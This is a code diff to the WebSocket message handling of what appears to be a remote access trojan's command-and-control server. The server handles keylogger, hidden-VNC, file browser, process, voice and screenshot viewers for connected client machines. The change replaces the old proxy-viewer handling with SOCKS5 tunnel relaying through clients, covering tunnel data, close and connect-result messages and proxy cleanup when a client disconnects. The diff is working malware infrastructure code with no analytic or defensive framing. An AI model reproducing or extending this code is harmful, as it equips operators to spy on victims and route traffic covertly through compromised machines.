@@ -11,6 +11,7 @@ import type { SocketData } from "../../sessions/types";
 import type { ClientInfo } from "../../types";
 import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong } from "../../wsHandlers";
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
+import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 
 type PendingScript = {
   timeout: ReturnType<typeof setTimeout>;
@@ -38,7 +39,6 @@ type WsLifecycleDeps = {
   handleFileBrowserViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
-  handleProxyViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleVoiceViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
@@ -48,7 +48,6 @@ type WsLifecycleDeps = {
   handleFileBrowserViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
-  handleProxyViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   takePendingNotificationScreenshot: (clientId: string) => any;
@@ -62,7 +61,9 @@ type WsLifecycleDeps = {
   handleNotificationScreenshotResult: (clientId: string, payload: any) => void;
   handleConsoleOutput: (payload: any) => void;
   handleFileBrowserMessage: (clientId: string, payload: any) => void;
-  handleProxyMessage: (clientId: string, payload: any) => void;
+  handleProxyTunnelData: (clientId: string, connectionId: string, data: Uint8Array) => void;
+  handleProxyTunnelClose: (clientId: string, connectionId: string) => void;
+  handleProxyConnectResult: (clientId: string, connectionId: string, ok: boolean) => void;
   handleProcessMessage: (clientId: string, payload: any) => void;
   handleKeyloggerMessage: (clientId: string, payload: any) => void;
   notifyRdInputLatency: (commandId: string) => void;
@@ -93,7 +94,6 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "file_browser_viewer") return deps.handleFileBrowserViewerOpen(ws);
   if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
   if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
-  if (role === "proxy_viewer") return deps.handleProxyViewerOpen(ws);
   if (role === "voice_viewer") return deps.handleVoiceViewerOpen(ws);
   if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
 
@@ -152,7 +152,6 @@ export function handleWebSocketMessage(
   if (socketRole === "file_browser_viewer") return deps.handleFileBrowserViewerMessage(ws, message);
   if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
   if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
-  if (socketRole === "proxy_viewer") return deps.handleProxyViewerMessage(ws, message);
   if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
   if (socketRole === "notifications_viewer") return;
 
@@ -258,7 +257,13 @@ export function handleWebSocketMessage(
           (payload as any).message,
         );
         deps.handleFileBrowserMessage(info.id, payload);
-        deps.handleProxyMessage(info.id, payload);
+        if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
+          deps.handleProxyConnectResult(
+            info.id,
+            (payload as any).commandId,
+            Boolean((payload as any).ok),
+          );
+        }
         break;
       case "command_progress":
         deps.handleFileBrowserMessage(info.id, payload);
@@ -304,6 +309,22 @@ export function handleWebSocketMessage(
       case "hvnc_clone_progress":
         deps.handleHVNCCloneProgress(info.id, payload);
         break;
+      case "proxy_data": {
+        const connId = (payload as any).connectionId;
+        const tunnelData = (payload as any).data;
+        if (typeof connId === "string" && tunnelData) {
+          const bytes = tunnelData instanceof Uint8Array ? tunnelData : new Uint8Array(tunnelData);
+          deps.handleProxyTunnelData(info.id, connId, bytes);
+        }
+        break;
+      }
+      case "proxy_close": {
+        const connId = (payload as any).connectionId;
+        if (typeof connId === "string") {
+          deps.handleProxyTunnelClose(info.id, connId);
+        }
+        break;
+      }
       default:
         break;
     }
@@ -414,13 +435,6 @@ export function handleWebSocketClose(
     return;
   }
 
-  if (role === "proxy_viewer") {
-    if (sessionId) {
-      sessionManager.deleteProxySession(sessionId);
-    }
-    return;
-  }
-
   if (role === "voice_viewer") {
     deps.cleanupVoiceViewer(ws);
     return;
@@ -434,6 +448,7 @@ export function handleWebSocketClose(
   }
 
   clientManager.deleteClient(clientId);
+  stopAllProxiesForClient(clientId);
   clearClientSyncState(clientId);
   deps.notifyConsoleClosed(clientId, "Client disconnected");
   setOnlineState(clientId, false);
